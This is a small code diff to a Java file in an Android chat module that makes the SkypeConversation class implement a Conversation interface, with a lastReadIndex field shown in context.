@@ -1,6 +1,6 @@
 package com.android.networking.module.chat;
 
-public class SkypeConversation {
+public class SkypeConversation implements Conversation{
 
 	//public String conversation;
 	public long lastReadIndex;
